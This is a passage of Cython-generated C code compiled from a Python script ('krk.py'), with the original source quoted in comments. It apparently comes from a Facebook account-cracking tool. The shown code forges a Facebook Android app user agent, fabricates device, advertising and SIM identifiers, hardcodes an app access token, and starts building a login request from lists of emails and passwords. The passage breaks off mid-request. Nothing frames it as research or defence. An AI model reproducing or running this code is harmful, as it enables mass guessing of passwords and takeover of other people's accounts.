        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_random); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 517, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_17 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_randint); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 517, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_17, __pyx_tuple__74, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 517, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __pyx_t_17 = __Pyx_PyObject_Str(__pyx_t_5); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 517, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_4, __pyx_t_17); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 517, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __pyx_t_17 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_FBCR); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 517, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_17, __pyx_v_fbcr); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 517, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __pyx_t_17 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_FBMF); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 517, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_17, __pyx_v_fbmf); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 517, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __pyx_t_17 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_FBBD); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 517, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_17, __pyx_v_fbbd); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 517, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __pyx_t_17 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_FBPN); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 517, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_17, __pyx_v_fbpn); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 517, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __pyx_t_17 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_FBDV); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 517, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_17, __pyx_v_fbdv); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 517, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __pyx_t_17 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_FBSV); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 517, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_17, __pyx_v_fbsv); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 517, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __pyx_t_17 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_9_FBOP_1_FBCA); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 517, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_17, __pyx_v_fbca); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 517, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __pyx_t_17 = PyNumber_Add(__pyx_t_5, __pyx_kp_s__75); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 517, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF_SET(__pyx_v_ua, __pyx_t_17);
        __pyx_t_17 = 0;

        /* "krk.py":518
 *                         fbpn = 'com.facebook.katana'
 *                         ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'9.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';en_US;FB4A;FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/'+fbdm+';{density=4.0,width=1440,height=3120};FBLC/en_US;FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';9;FBOP/1;FBCA/'+fbca+';]'
 *                         random_seed = random.Random()             # <<<<<<<<<<<<<<
 *                         adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
 *                         device_id = str(uuid.uuid4())
 */
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_random); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 518, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_Random); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 518, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = NULL;
        __pyx_t_10 = 0;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
          __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_4);
          if (likely(__pyx_t_5)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
            __Pyx_INCREF(__pyx_t_5);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_4, function);
            __pyx_t_10 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[1] = {__pyx_t_5, };
          __pyx_t_17 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+1-__pyx_t_10, 0+__pyx_t_10);
          __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
          if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 518, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_17);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        }
        __Pyx_XDECREF_SET(__pyx_v_random_seed, __pyx_t_17);
        __pyx_t_17 = 0;

        /* "krk.py":519
 *                         ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'9.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';en_US;FB4A;FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/'+fbdm+';{density=4.0,width=1440,height=3120};FBLC/en_US;FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';9;FBOP/1;FBCA/'+fbca+';]'
 *                         random_seed = random.Random()
 *                         adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))             # <<<<<<<<<<<<<<
 *                         device_id = str(uuid.uuid4())
 *                         secure = str(uuid.uuid4())
 */
        __pyx_t_17 = __Pyx_PyObject_GetAttrStr(__pyx_v_random_seed, __pyx_n_s_choices); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 519, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_string); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 519, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_hexdigits); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 519, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = PyTuple_New(1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 519, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_GIVEREF(__pyx_t_5);
        PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_t_5);
        __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 519, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_k, __pyx_int_16) < 0) __PYX_ERR(0, 519, __pyx_L3_error)
        __pyx_t_9 = __Pyx_PyObject_Call(__pyx_t_17, __pyx_t_4, __pyx_t_5); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 519, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_9);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_PyString_Join(__pyx_kp_s__52, __pyx_t_9); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 519, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        __pyx_t_9 = __Pyx_PyObject_Str(__pyx_t_5); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 519, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_9);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF_SET(__pyx_v_adid, __pyx_t_9);
        __pyx_t_9 = 0;

        /* "krk.py":520
 *                         random_seed = random.Random()
 *                         adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
 *                         device_id = str(uuid.uuid4())             # <<<<<<<<<<<<<<
 *                         secure = str(uuid.uuid4())
 *                         family = str(uuid.uuid4())
 */
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_uuid); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 520, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_uuid4); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 520, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = NULL;
        __pyx_t_10 = 0;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
          __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_4);
          if (likely(__pyx_t_5)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
            __Pyx_INCREF(__pyx_t_5);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_4, function);
            __pyx_t_10 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[1] = {__pyx_t_5, };
          __pyx_t_9 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+1-__pyx_t_10, 0+__pyx_t_10);
          __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
          if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 520, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_9);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        }
        __pyx_t_4 = __Pyx_PyObject_Str(__pyx_t_9); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 520, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        __Pyx_XDECREF_SET(__pyx_v_device_id, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "krk.py":521
 *                         adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
 *                         device_id = str(uuid.uuid4())
 *                         secure = str(uuid.uuid4())             # <<<<<<<<<<<<<<
 *                         family = str(uuid.uuid4())
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 */
        __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_uuid); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 521, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_9);
        __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_9, __pyx_n_s_uuid4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 521, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        __pyx_t_9 = NULL;
        __pyx_t_10 = 0;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
          __pyx_t_9 = PyMethod_GET_SELF(__pyx_t_5);
          if (likely(__pyx_t_9)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
            __Pyx_INCREF(__pyx_t_9);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_5, function);
            __pyx_t_10 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[1] = {__pyx_t_9, };
          __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+1-__pyx_t_10, 0+__pyx_t_10);
          __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
          if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 521, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        }
        __pyx_t_5 = __Pyx_PyObject_Str(__pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 521, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF_SET(__pyx_v_secure, __pyx_t_5);
        __pyx_t_5 = 0;

        /* "krk.py":522
 *                         device_id = str(uuid.uuid4())
 *                         secure = str(uuid.uuid4())
 *                         family = str(uuid.uuid4())             # <<<<<<<<<<<<<<
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 *                         xd =str(''.join(random_seed.choices(string.digits, k=20)))
 */
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_uuid); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 522, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_uuid4); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 522, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_9);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = NULL;
        __pyx_t_10 = 0;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_9))) {
          __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_9);
          if (likely(__pyx_t_4)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
            __Pyx_INCREF(__pyx_t_4);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_9, function);
            __pyx_t_10 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[1] = {__pyx_t_4, };
          __pyx_t_5 = __Pyx_PyObject_FastCall(__pyx_t_9, __pyx_callargs+1-__pyx_t_10, 0+__pyx_t_10);
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 522, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        }
        __pyx_t_9 = __Pyx_PyObject_Str(__pyx_t_5); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 522, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_9);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF_SET(__pyx_v_family, __pyx_t_9);
        __pyx_t_9 = 0;

        /* "krk.py":523
 *                         secure = str(uuid.uuid4())
 *                         family = str(uuid.uuid4())
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'             # <<<<<<<<<<<<<<
 *                         xd =str(''.join(random_seed.choices(string.digits, k=20)))
 *                         sim_serials = f'["{xd}"]'
 */
        __Pyx_INCREF(__pyx_kp_s_350685531728_62f8ce9f74b12f84c12);
        __Pyx_DECREF_SET(__pyx_v_accessToken, __pyx_kp_s_350685531728_62f8ce9f74b12f84c12);

        /* "krk.py":524
 *                         family = str(uuid.uuid4())
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 *                         xd =str(''.join(random_seed.choices(string.digits, k=20)))             # <<<<<<<<<<<<<<
 *                         sim_serials = f'["{xd}"]'
 *                         li = ['28','29','210']
 */
        __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_v_random_seed, __pyx_n_s_choices); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 524, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_9);
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_string); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 524, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_digits); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 524, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyTuple_New(1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 524, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_GIVEREF(__pyx_t_4);
        PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_t_4);
        __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 524, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_k, __pyx_int_20) < 0) __PYX_ERR(0, 524, __pyx_L3_error)
        __pyx_t_17 = __Pyx_PyObject_Call(__pyx_t_9, __pyx_t_5, __pyx_t_4); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 524, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyString_Join(__pyx_kp_s__52, __pyx_t_17); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 524, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __pyx_t_17 = __Pyx_PyObject_Str(__pyx_t_4); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 524, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF_SET(__pyx_v_xd, __pyx_t_17);
        __pyx_t_17 = 0;

        /* "krk.py":525
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 *                         xd =str(''.join(random_seed.choices(string.digits, k=20)))
 *                         sim_serials = f'["{xd}"]'             # <<<<<<<<<<<<<<
 *                         li = ['28','29','210']
 *                         li2 = random.choice(li)
 */
        __pyx_t_17 = PyTuple_New(3); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 525, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __pyx_t_21 = 0;
        __pyx_t_22 = 127;
        __Pyx_INCREF(__pyx_kp_u__76);
        __pyx_t_21 += 2;
        __Pyx_GIVEREF(__pyx_kp_u__76);
        PyTuple_SET_ITEM(__pyx_t_17, 0, __pyx_kp_u__76);
        __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_v_xd, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 525, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_22 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_22) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_22;
        __pyx_t_21 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
        __Pyx_GIVEREF(__pyx_t_4);
        PyTuple_SET_ITEM(__pyx_t_17, 1, __pyx_t_4);
        __pyx_t_4 = 0;
        __Pyx_INCREF(__pyx_kp_u__77);
        __pyx_t_21 += 2;
        __Pyx_GIVEREF(__pyx_kp_u__77);
        PyTuple_SET_ITEM(__pyx_t_17, 2, __pyx_kp_u__77);
        __pyx_t_4 = __Pyx_PyUnicode_Join(__pyx_t_17, 3, __pyx_t_21, __pyx_t_22); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 525, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __Pyx_XDECREF_SET(__pyx_v_sim_serials, ((PyObject*)__pyx_t_4));
        __pyx_t_4 = 0;

        /* "krk.py":526
 *                         xd =str(''.join(random_seed.choices(string.digits, k=20)))
 *                         sim_serials = f'["{xd}"]'
 *                         li = ['28','29','210']             # <<<<<<<<<<<<<<
 *                         li2 = random.choice(li)
 *                         j1 = ''.join(random.choice(digits) for _ in range(2))
 */
        __pyx_t_4 = PyList_New(3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 526, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_INCREF(__pyx_kp_s_28);
        __Pyx_GIVEREF(__pyx_kp_s_28);
        PyList_SET_ITEM(__pyx_t_4, 0, __pyx_kp_s_28);
        __Pyx_INCREF(__pyx_kp_s_29);
        __Pyx_GIVEREF(__pyx_kp_s_29);
        PyList_SET_ITEM(__pyx_t_4, 1, __pyx_kp_s_29);
        __Pyx_INCREF(__pyx_kp_s_210);
        __Pyx_GIVEREF(__pyx_kp_s_210);
        PyList_SET_ITEM(__pyx_t_4, 2, __pyx_kp_s_210);
        __Pyx_XDECREF_SET(__pyx_v_li, ((PyObject*)__pyx_t_4));
        __pyx_t_4 = 0;

        /* "krk.py":527
 *                         sim_serials = f'["{xd}"]'
 *                         li = ['28','29','210']
 *                         li2 = random.choice(li)             # <<<<<<<<<<<<<<
 *                         j1 = ''.join(random.choice(digits) for _ in range(2))
 *                         jazoest = li2+j1
 */
        __Pyx_GetModuleGlobalName(__pyx_t_17, __pyx_n_s_random); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 527, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_17, __pyx_n_s_choice); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 527, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __pyx_t_17 = NULL;
        __pyx_t_10 = 0;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
          __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_5);
          if (likely(__pyx_t_17)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
            __Pyx_INCREF(__pyx_t_17);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_5, function);
            __pyx_t_10 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_17, __pyx_v_li};
          __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+1-__pyx_t_10, 1+__pyx_t_10);
          __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
          if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 527, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        }
        __Pyx_XDECREF_SET(__pyx_v_li2, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "krk.py":528
 *                         li = ['28','29','210']
 *                         li2 = random.choice(li)
 *                         j1 = ''.join(random.choice(digits) for _ in range(2))             # <<<<<<<<<<<<<<
 *                         jazoest = li2+j1
 *                         data = {
 */
        __pyx_t_4 = __pyx_pf_3krk_4api1_genexpr(NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 528, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_5 = __Pyx_PyString_Join(__pyx_kp_s__52, __pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 528, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF_SET(__pyx_v_j1, ((PyObject*)__pyx_t_5));
        __pyx_t_5 = 0;

        /* "krk.py":529
 *                         li2 = random.choice(li)
 *                         j1 = ''.join(random.choice(digits) for _ in range(2))
 *                         jazoest = li2+j1             # <<<<<<<<<<<<<<
 *                         data = {
 *                                 'adid':adid,
 */
        __pyx_t_5 = PyNumber_Add(__pyx_v_li2, __pyx_v_j1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 529, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_XDECREF_SET(__pyx_v_jazoest, __pyx_t_5);
        __pyx_t_5 = 0;

        /* "krk.py":531
 *                         jazoest = li2+j1
 *                         data = {
 *                                 'adid':adid,             # <<<<<<<<<<<<<<
 *                                 'format':'json',
 *                                 'device_id':device_id,
 */
        __pyx_t_5 = __Pyx_PyDict_NewPresized(15); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 531, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_adid, __pyx_v_adid) < 0) __PYX_ERR(0, 531, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_format, __pyx_n_s_json) < 0) __PYX_ERR(0, 531, __pyx_L3_error)

        /* "krk.py":533
 *                                 'adid':adid,
 *                                 'format':'json',
 *                                 'device_id':device_id,             # <<<<<<<<<<<<<<
 *                                 'email':ids,
 *                                 'password':pas,
 */
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_device_id, __pyx_v_device_id) < 0) __PYX_ERR(0, 531, __pyx_L3_error)

        /* "krk.py":534
 *                                 'format':'json',
 *                                 'device_id':device_id,
 *                                 'email':ids,             # <<<<<<<<<<<<<<
 *                                 'password':pas,
 *                                 'generate_analytics_claims':'1',
 */
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_email, __pyx_v_ids) < 0) __PYX_ERR(0, 531, __pyx_L3_error)

        /* "krk.py":535
 *                                 'device_id':device_id,
 *                                 'email':ids,
 *                                 'password':pas,             # <<<<<<<<<<<<<<
 *                                 'generate_analytics_claims':'1',
 *                                 'credentials_type':'password',
 */
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_password, __pyx_v_pas) < 0) __PYX_ERR(0, 531, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_generate_analytics_claims, __pyx_kp_s_1) < 0) __PYX_ERR(0, 531, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_credentials_type, __pyx_n_s_password) < 0) __PYX_ERR(0, 531, __pyx_L3_error)
